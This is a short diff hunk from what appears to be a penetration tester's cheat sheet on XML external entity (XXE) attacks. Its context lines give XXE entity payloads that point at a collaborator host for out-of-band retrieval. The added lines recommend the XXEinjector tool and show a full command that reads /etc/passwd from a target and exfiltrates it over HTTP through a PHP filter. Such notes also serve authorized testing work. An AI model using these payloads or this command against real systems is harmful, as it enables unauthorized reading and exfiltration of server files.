@@ -430,8 +430,8 @@ can put http://ip_of_the_server/directory and follow directories that appear in 
 can put "http://collaborator_ip" in <!ENTITY xxe SYSTEM "http://collaborator">
  [<!ENTITY % xxe SYSTEM "https://burpcollaborator"> %xxe]     automatically without &xxe
   
-  
-
+  XXEinjector	==> best injection xxe tool ==> https://github.com/hossamshady/XXEinjector
+ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
 
 --------------------------------------------------------------------------------------------
                                        information disclosure
